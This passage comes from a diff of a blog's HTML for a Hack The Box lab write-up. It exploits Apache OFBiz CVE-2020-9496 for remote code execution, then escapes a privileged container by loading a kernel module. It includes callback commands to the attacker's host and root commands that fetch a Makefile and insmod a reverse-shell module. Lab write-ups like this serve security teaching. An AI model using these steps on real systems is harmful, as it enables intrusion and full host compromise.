+</code></pre><p>When we access this address on our local browser we can see this page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-92.png" class="kg-image" alt loading="lazy"></figure><p>A quick scan of the port tells us that the <code>SSL</code> certificate was emitted for <code>ofbiz-vm.apache.org</code>, which points to an <a href="https://ofbiz.apache.org/?ref=localhost">Apache OFBiz</a> applications.</p><pre><code>~ nmap -sC -sV -A localhost -p 8443
 
 PORT     STATE SERVICE  VERSION
 
 8443/tcp open  ssl/http Apache Tomcat 9.0.31
 |_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
 | ssl-cert: Subject: commonName=ofbiz-vm.apache.org/organizationName=Apache Software Fundation/stateOrProvinceName=DE/countryName=US
-...</code></pre><blockquote><strong>Apache OFBiz</strong> is a suite of business applications flexible enough to be used across any industry. A common architecture allows developers to easily extend or enhance it to create custom features.</blockquote><p>This framework has some <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=45&amp;product_id=28350&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=3&amp;trc=33&amp;sha=6402b2a5500eca02d0aa351eb1febae7c45a174a">serious vulnerabilities</a>, one of them being <code>CVE-2020-9496</code> which enables unauthenticated RCE:</p><blockquote>OfBiz exposes an <code>XMLRPC</code> endpoint at <code>/webtools/control/xmlrpc</code>. This is an unauthenticated endpoint since authentication is applied on a per-service basis. However, the <code>XMLRPC</code> request is processed before authentication. As part of this processing, any serialized arguments for the remote invocation are deserialized, therefore if the classpath contains any classes that can be used as gadgets to achieve remote code execution, an attacker will be able to run arbitrary system commands on any OfBiz server with same privileges as the servlet container running OfBiz.</blockquote><p>I found a really <a href="https://github.com/ambalabanov/CVE-2020-9496">great POC on Github</a> and gave it a shot:</p><pre><code>~ git clone git@github.com:ambalabanov/CVE-2020-9496.git
+...</code></pre><blockquote><strong>Apache OFBiz</strong> is a suite of business applications flexible enough to be used across any industry. A common architecture allows developers to easily extend or enhance it to create custom features.</blockquote><p>This framework has some <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=45&product_id=28350&version_id=&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=3&trc=33&sha=6402b2a5500eca02d0aa351eb1febae7c45a174a&ref=localhost">serious vulnerabilities</a>, one of them being <code>CVE-2020-9496</code> which enables unauthenticated RCE:</p><blockquote>OfBiz exposes an <code>XMLRPC</code> endpoint at <code>/webtools/control/xmlrpc</code>. This is an unauthenticated endpoint since authentication is applied on a per-service basis. However, the <code>XMLRPC</code> request is processed before authentication. As part of this processing, any serialized arguments for the remote invocation are deserialized, therefore if the classpath contains any classes that can be used as gadgets to achieve remote code execution, an attacker will be able to run arbitrary system commands on any OfBiz server with same privileges as the servlet container running OfBiz.</blockquote><p>I found a really <a href="https://github.com/ambalabanov/CVE-2020-9496?ref=localhost">great POC on Github</a> and gave it a shot:</p><pre><code>~ git clone git@github.com:ambalabanov/CVE-2020-9496.git
 ~ cd CVE-2020-9496
 ~ wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial.jar
 ~ brew install --cask adoptopenjdk8brew tap adoptopenjdk/openjdk
@@ -402,7 +445,7 @@ Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...</code></pre><p>... 
 cmd&gt; curl http://10.10.14.9:9000
 [!] Send payload ...
 [+] Done!</code></pre><p>I got a connection from <code>10.10.10.238</code> which is the host machine's IP, so I knew this was working:</p><pre><code>10.10.10.238 - - [29/Sep/2021 21:37:38] "GET / HTTP/1.1" 200 -
-</code></pre><p>With RCE on the container, I decided to make enumeration a little easier and faster with a Python script:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/66ed776a17b81a2313a78ba3456867d0.js"></script><!--kg-card-end: html--><p>After using this script with some <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Seclists</a>, I couldn't find any relevant files or hints, so I started thinking that this was a straightforward container escape.</p><p>I was also getting a little frustrated with not having a shell into the machine, so I decided to abandon my script and give Metasploit a try.</p><p>After some tweaking, I finally got it:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/10/Screenshot-2021-10-02-at-14.10.53.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="the-final-step">The final step</h2><p>This was definitely the hardest part. I knew I had to escape from the container, and tried a lot of known exploits without any luck.</p><p>Finally, after a loooong and frustrating process I found <a href="https://xcellerator.github.io/posts/docker_escape/">this</a> article from 2020: "Privileged Container Escapes with Kernel Modules":</p><blockquote>It turns out that privileged containers (or just those with <code>CAP_SYS_MODULE</code>) are able to use the <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_init_module()</code></a> and <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_finit_module()</code></a> syscalls - which are what’s used to load kernel modules. <br>As all containers share their kernel with the host (unlike VMs), this clearly results in yet another complete system compromise.</blockquote><p>This led me to find <a href="https://blog.nody.cc/posts/container-breakouts-part2/">this</a> POC:</p><figure class="kg-card kg-code-card"><pre><code>#include &lt;linux/kmod.h&gt;
+</code></pre><p>With RCE on the container, I decided to make enumeration a little easier and faster with a Python script:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/66ed776a17b81a2313a78ba3456867d0.js"></script><!--kg-card-end: html--><p>After using this script with some <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI?ref=localhost">LFI Seclists</a>, I couldn't find any relevant files or hints, so I started thinking that this was a straightforward container escape.</p><p>I was also getting a little frustrated with not having a shell into the machine, so I decided to abandon my script and give Metasploit a try.</p><p>After some tweaking, I finally got it:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/10/Screenshot-2021-10-02-at-14.10.53.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="the-final-step">The final step</h2><p>This was definitely the hardest part. I knew I had to escape from the container, and tried a lot of known exploits without any luck.</p><p>Finally, after a loooong and frustrating process I found <a href="https://xcellerator.github.io/posts/docker_escape/?ref=localhost">this</a> article from 2020: "Privileged Container Escapes with Kernel Modules":</p><blockquote>It turns out that privileged containers (or just those with <code>CAP_SYS_MODULE</code>) are able to use the <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html?ref=localhost"><code>sys_init_module()</code></a> and <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html?ref=localhost"><code>sys_finit_module()</code></a> syscalls - which are what’s used to load kernel modules. <br>As all containers share their kernel with the host (unlike VMs), this clearly results in yet another complete system compromise.</blockquote><p>This led me to find <a href="https://blog.nody.cc/posts/container-breakouts-part2/?ref=localhost">this</a> POC:</p><figure class="kg-card kg-code-card"><pre><code>#include &lt;linux/kmod.h&gt;
 #include &lt;linux/module.h&gt;
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("AttackDefense");
@@ -437,195 +480,203 @@ root@79931c1ed9a2:/# wget http://10.10.14.22:9000/Makefile
 root@79931c1ed9a2:/# export PATH=/usr/lib/gcc/x86_64-linux-gnu/8/:$PATH
 root@79931c1ed9a2:/# make clean
 root@79931c1ed9a2:/# make
-root@79931c1ed9a2:/# insmod reverse-shell.ko</code></pre><p>And that's it!</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/10/Screenshot-2021-10-02-at-14.13.45.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="references">References</h2><ul><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></li><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html">https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html</a></li><li><a href="https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/">https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/</a></li><li><a href="https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32</a></li><li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress">https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress</a></li><li><a href="https://alexander.holbreich.org/docker-components-explained/">https://alexander.holbreich.org/docker-components-explained/</a></li><li><a href="https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md">https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md</a></li><li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket</a></li><li><a href="https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</a></li><li><a href="https://blog.nody.cc/posts/container-breakouts-part2/">https://blog.nody.cc/posts/container-breakouts-part2/</a></li></ul>
-    </section>
+root@79931c1ed9a2:/# insmod reverse-shell.ko</code></pre><p>And that's it!</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/10/Screenshot-2021-10-02-at-14.13.45.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="references">References</h2><ul><li><a href="https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1?ref=localhost">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></li><li><a href="https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2?ref=localhost">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html?ref=localhost">https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html</a></li><li><a href="https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/?ref=localhost">https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/</a></li><li><a href="https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32?ref=localhost">https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32</a></li><li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress?ref=localhost">https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress</a></li><li><a href="https://alexander.holbreich.org/docker-components-explained/?ref=localhost">https://alexander.holbreich.org/docker-components-explained/</a></li><li><a href="https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md?ref=localhost">https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md</a></li><li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout?ref=localhost#mounted-docker-socket">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket</a></li><li><a href="https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html?ref=localhost">https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</a></li><li><a href="https://blog.nody.cc/posts/container-breakouts-part2/?ref=localhost">https://blog.nody.cc/posts/container-breakouts-part2/</a></li></ul>
+        </section>
+
+    </article>
 
 
-</article>
-
-<section class="footer-cta">
-    <div class="inner">
-        <h2>Sign up for more like this.</h2>
-        <a class="footer-cta-button" href="index.html#/portal">
-            <div>Enter your email</div>
-            <span>Subscribe</span>
-        </a>
-    </div>
-</section>
+</main>
 
 
-<aside class="read-more-wrap">
-    <div class="read-more inner">
-
-
-                    
-<article class="post-card post ">
-
-    <a class="post-card-image-link" href="../htb-write-up-horizontall/index.html">
-        <img class="post-card-image"
-            srcset="../content/images/size/w300/2025/01/Horizontall-1.png 300w,
-                   ../content/images/size/w600/2025/01/Horizontall-1.png 600w,
-                  ../content/images/size/w1000/2025/01/Horizontall-1.png 1000w,
-                 ../content/images/size/w2000/2025/01/Horizontall-1.png 2000w"
-            sizes="(max-width: 1000px) 400px, 800px"
-            src="../content/images/size/w600/2025/01/Horizontall-1.png"
-            alt="HTB Write-up | Horizontall (user-only)"
-            loading="lazy"
-        />
+            <section class="gh-container is-grid gh-outer">
+                <div class="gh-container-inner gh-inner">
+                    <h2 class="gh-container-title">Read more</h2>
+                    <div class="gh-feed">
+                            <article class="gh-card post">
+    <a class="gh-card-link" href="../htb-write-up-horizontall/index.html">
+            <figure class="gh-card-image">
+                <img
+                    srcset="../content/images/size/w160/format/webp/2025/01/Horizontall-1.png 160w,
+                           ../content/images/size/w320/format/webp/2025/01/Horizontall-1.png 320w,
+                          ../content/images/size/w600/format/webp/2025/01/Horizontall-1.png 600w,
+                         ../content/images/size/w960/format/webp/2025/01/Horizontall-1.png 960w,
+                        ../content/images/size/w1200/format/webp/2025/01/Horizontall-1.png.png 1200w,
+                       ../content/images/size/w2000/format/webp/2025/01/Horizontall-1.png1.png 2000w"
+                    sizes="320px"
+                    src="../content/images/size/w600/2025/01/Horizontall-1.png"
+                    alt="HTB Write-up | Horizontall (user-only)"
+                    loading="lazy"
+                >
+            </figure>
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">HTB Write-up | Horizontall (user-only)</h3>
+                <p class="gh-card-excerpt is-body">Write-up for Horizontall, a retired HTB Linux machine.</p>
+            <footer class="gh-card-meta">
+<!--
+             -->
+                    <span class="gh-card-author">By Inês Martins</span>
+                    <time class="gh-card-date" datetime="2025-01-03">03 Jan 2025</time>
+                <!--
+         --></footer>
+        </div>
     </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="../htb-write-up-horizontall/index.html">
-            <header class="post-card-header">
-                <h2 class="post-card-title">HTB Write-up | Horizontall (user-only)</h2>
-            </header>
-            <section class="post-card-excerpt">
-                <p>Write-up for Horizontall, a retired HTB Linux machine.</p>
-            </section>
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-                    <a href="../author/ines/index.html" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="../author/ines/index.html">Inês Martins</a></span>
-                <span class="post-card-byline-date"><time datetime="2025-01-03">Jan 3, 2025</time> <span class="bull">&bull;</span> 3 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
 </article>
-                    
-<article class="post-card post ">
+                            <article class="gh-card post">
+    <a class="gh-card-link" href="../automate-threat-modeling-with-pytm-and-github-actions/index.html">
+            <figure class="gh-card-image">
+                <img
+                    srcset="../content/images/size/w160/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 160w,
+                           ../content/images/size/w320/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 320w,
+                          ../content/images/size/w600/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 600w,
+                         ../content/images/size/w960/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 960w,
+                        ../content/images/size/w1200/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png.png 1200w,
+                       ../content/images/size/w2000/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png1.png 2000w"
+                    sizes="320px"
+                    src="../content/images/size/w600/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png"
+                    alt="Automatic Threat Modeling with pytm and Github Actions"
+                    loading="lazy"
+                >
+            </figure>
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">Automatic Threat Modeling with pytm and Github Actions</h3>
+                    <p class="gh-card-excerpt is-body">pytm is a OWASP tool that integrates with a custom GPT to make the threat modeling process quicker and more automated.
 
-    <a class="post-card-image-link" href="../automate-threat-modeling-with-pytm-and-github-actions/index.html">
-        <img class="post-card-image"
-            srcset="../content/images/size/w300/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 300w,
-                   ../content/images/size/w600/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 600w,
-                  ../content/images/size/w1000/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 1000w,
-                 ../content/images/size/w2000/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 2000w"
-            sizes="(max-width: 1000px) 400px, 800px"
-            src="../content/images/size/w600/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png"
-            alt="Automatic Threat Modeling with pytm and Github Actions"
-            loading="lazy"
-        />
+I&#39;ve developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated</p>
+            <footer class="gh-card-meta">
+<!--
+             -->
+                    <span class="gh-card-author">By Inês Martins</span>
+                    <time class="gh-card-date" datetime="2024-11-14">14 Nov 2024</time>
+                <!--
+         --></footer>
+        </div>
     </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="../automate-threat-modeling-with-pytm-and-github-actions/index.html">
-            <header class="post-card-header">
-                <h2 class="post-card-title">Automatic Threat Modeling with pytm and Github Actions</h2>
-            </header>
-            <section class="post-card-excerpt">
-                <p>pytm is a OWASP tool that integrates with a custom GPT to make the threat modeling process quicker and more automated. I've developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated using the</p>
-            </section>
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-                    <a href="../author/ines/index.html" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="../author/ines/index.html">Inês Martins</a></span>
-                <span class="post-card-byline-date"><time datetime="2024-11-14">Nov 14, 2024</time> <span class="bull">&bull;</span> 1 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
 </article>
-                    
-<article class="post-card post ">
-
-    <a class="post-card-image-link" href="../htb-writeup-formulax/index.html">
-        <img class="post-card-image"
-            srcset="../content/images/size/w300/2024/11/Screenshot-2024-11-13-at-13.35.35.png 300w,
-                   ../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.35.png 600w,
-                  ../content/images/size/w1000/2024/11/Screenshot-2024-11-13-at-13.35.35.png 1000w,
-                 ../content/images/size/w2000/2024/11/Screenshot-2024-11-13-at-13.35.35.png 2000w"
-            sizes="(max-width: 1000px) 400px, 800px"
-            src="../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.35.png"
-            alt="HTB Write-up | FormulaX (user-only)"
-            loading="lazy"
-        />
+                            <article class="gh-card post">
+    <a class="gh-card-link" href="../htb-writeup-formulax/index.html">
+            <figure class="gh-card-image">
+                <img
+                    srcset="../content/images/size/w160/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 160w,
+                           ../content/images/size/w320/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 320w,
+                          ../content/images/size/w600/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 600w,
+                         ../content/images/size/w960/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 960w,
+                        ../content/images/size/w1200/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png.png 1200w,
+                       ../content/images/size/w2000/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png5.png 2000w"
+                    sizes="320px"
+                    src="../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.35.png"
+                    alt="HTB Write-up | FormulaX (user-only)"
+                    loading="lazy"
+                >
+            </figure>
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">HTB Write-up | FormulaX (user-only)</h3>
+                <p class="gh-card-excerpt is-body">Write-up for FormulaX, a retired HTB Linux machine.</p>
+            <footer class="gh-card-meta">
+<!--
+             -->
+                    <span class="gh-card-author">By Inês Martins</span>
+                    <time class="gh-card-date" datetime="2024-11-13">13 Nov 2024</time>
+                <!--
+         --></footer>
+        </div>
     </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="../htb-writeup-formulax/index.html">
-            <header class="post-card-header">
-                <h2 class="post-card-title">HTB Write-up | FormulaX (user-only)</h2>
-            </header>
-            <section class="post-card-excerpt">
-                <p>Write-up for FormulaX, a retired HTB Linux machine.</p>
-            </section>
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-                    <a href="../author/ines/index.html" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="../author/ines/index.html">Inês Martins</a></span>
-                <span class="post-card-byline-date"><time datetime="2024-11-13">Nov 13, 2024</time> <span class="bull">&bull;</span> 12 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
 </article>
+                            <article class="gh-card post">
+    <a class="gh-card-link" href="../htb-writeup-blazorized/index.html">
+            <figure class="gh-card-image">
+                <img
+                    srcset="../content/images/size/w160/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png 160w,
+                           ../content/images/size/w320/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png 320w,
+                          ../content/images/size/w600/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png 600w,
+                         ../content/images/size/w960/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png 960w,
+                        ../content/images/size/w1200/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png.png 1200w,
+                       ../content/images/size/w2000/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png8.png 2000w"
+                    sizes="320px"
+                    src="../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.48.png"
+                    alt="HTB Write-up | Blazorized (user-only)"
+                    loading="lazy"
+                >
+            </figure>
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">HTB Write-up | Blazorized (user-only)</h3>
+                <p class="gh-card-excerpt is-body">Write-up for Blazorized, a retired HTB Windows machine.</p>
+            <footer class="gh-card-meta">
+<!--
+             -->
+                    <span class="gh-card-author">By Inês Martins</span>
+                    <time class="gh-card-date" datetime="2024-11-13">13 Nov 2024</time>
+                <!--
+         --></footer>
+        </div>
+    </a>
+</article>
+                    </div>
+                </div>
+            </section>
 
-    </div>
-</aside>
+    
+    <footer class="gh-footer gh-outer">
+    <div class="gh-footer-inner gh-inner">
 
-
-    </main>
-
-    <footer class="site-footer outer">
-        <div class="inner">
-            <section class="copyright"><a href="../index.html"></a> &copy; 2025</section>
-            <nav class="site-footer-nav">
+        <div class="gh-footer-bar">
+            <span class="gh-footer-logo is-title">
+                    
+            </span>
+            <nav class="gh-footer-menu">
                 
             </nav>
-            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+            <div class="gh-footer-copyright">
+                Powered by <a href="https://ghost.org/" target="_blank" rel="noopener">Ghost</a>
+            </div>
         </div>
-    </footer>
 
+    </div>
+</footer>    
 </div>
 
+    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="pswp__bg"></div>
 
-<script
-    src="https://code.jquery.com/jquery-3.5.1.min.js"
-    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
-    crossorigin="anonymous">
-</script>
-<script src="../assets/built/casper.js%3Fv=aa2daa7cee"></script>
-<script>
-$(document).ready(function () {
-    // Mobile Menu Trigger
-    $('.gh-burger').click(function () {
-        $('body').toggleClass('gh-head-open');
-    });
-    // FitVids - Makes video embeds responsive
-    $(".gh-content").fitVids();
-});
-</script>
+    <div class="pswp__scroll-wrap">
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="../assets/built/source.js%3Fv=e213fc6d24"></script>
 
 
 
